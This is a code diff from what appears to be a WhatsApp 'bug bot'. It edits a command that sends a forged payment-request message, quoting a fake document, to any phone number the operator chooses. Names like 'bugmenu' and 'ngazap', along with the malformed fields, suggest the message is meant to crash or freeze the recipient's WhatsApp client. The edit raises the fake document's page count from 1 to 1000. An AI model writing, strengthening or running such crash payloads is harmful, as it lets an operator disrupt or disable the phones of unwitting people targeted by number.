@@ -1033,7 +1033,7 @@ xinn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPay
 break
 
 case 'amarahxen':
-const docu = { 
+var doc795 = { 
 key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
@@ -1044,19 +1044,19 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "mimetype": "application/octet-stream",
 "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
 "fileLength": "64455",
-"pageCount": 1,
+"pageCount": 1000,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
 "fileName": `POWERED BY XIN${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
-xinn.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `POWERED BY XIN`,"body": `Selamat kak ${pushname}`,
+xinn.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: 'teks', currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `POWERED BY XIN`,"body": `Selamat kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `${nomore2}`,
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/Xinnchan_795`,
+sourceUrl: `https://youtube.com/c/XinnChan`,
 thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
 thumbnail: fs.readFileSync("./XeonMedia/virgam.jpeg"),
 }
-}}}}}, { quoted:docu})
+}}}}}, { quoted: doc795 })
 break
 
 case 'bugmenu':
